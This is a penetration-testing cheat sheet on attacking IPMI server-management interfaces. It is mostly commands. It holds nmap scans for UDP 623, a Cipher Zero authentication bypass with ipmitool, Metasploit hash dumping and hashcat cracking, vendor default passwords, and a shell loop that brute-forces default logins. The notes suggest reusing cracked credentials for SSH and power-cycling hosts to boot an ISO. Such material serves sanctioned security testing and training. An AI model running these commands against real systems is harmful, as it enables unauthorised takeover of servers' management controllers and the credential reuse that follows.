---
id: ipmi-enum
title: IPMI Enumeration
stage: enumeration
tags: [linux, windows]
tools:
  - nmap -sU -p623 --script ipmi-version,ipmi-brute $TARGET
  - msfconsole → use auxiliary/scanner/ipmi/ipmi_dumphashes
  - ipmitool -I lanplus -H $TARGET -U admin -P admin chassis status
  - hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
leads_to: [password-spray, ssh-access]
summary: Exploit IPMI 2.0 to dump password hashes or bypass authentication via Cipher 0.
---

## Detect IPMI (UDP 623)

IPMI runs on UDP — missed by default TCP-only scans.

```bash
nmap -sU -p623 $TARGET
nmap -sU -p623 --script ipmi-version $TARGET
# Output: Intelligent Platform Management Interface (IPMI)
```

## Cipher Zero Authentication Bypass

IPMI 2.0 with Cipher Suite 0 authenticates with **any** password:

```bash
nmap -sU -p623 --script ipmi-cipher-zero $TARGET

# If vulnerable, connect with anything as password
ipmitool -I lanplus -C 0 -H $TARGET -U admin -P anything chassis status
ipmitool -I lanplus -C 0 -H $TARGET -U ADMIN -P '' user list
```

## Hash Dumping — Metasploit

IPMI 2.0 RAKP authentication sends a salted SHA1/MD5 hash of the password to the client, which can be captured:

```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS $TARGET
set OUTPUTFILE /tmp/ipmi_hashes.txt
run
```

Crack the hashes:
```bash
hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Default Credentials

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | (random, on chassis label) |
| Supermicro | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Fujitsu iRMC | admin | admin |

```bash
for user in admin ADMIN root administrator; do
  for pass in admin ADMIN calvin PASSW0RD ''; do
    ipmitool -I lanplus -H $TARGET -U $user -P $pass chassis status 2>/dev/null && echo "HIT: $user:$pass"
  done
done
```

## Notes

- IPMI runs on **UDP 623** — always include `-sU` in your scan
- Cracked IPMI credentials are frequently reused for SSH, web admin panels, iDRAC web UIs
- BMCs often have a separate management NIC on a different subnet — check for alternate IPs
- After cracking, log into the web portal or ipmitool — you can power cycle the machine and boot to ISO
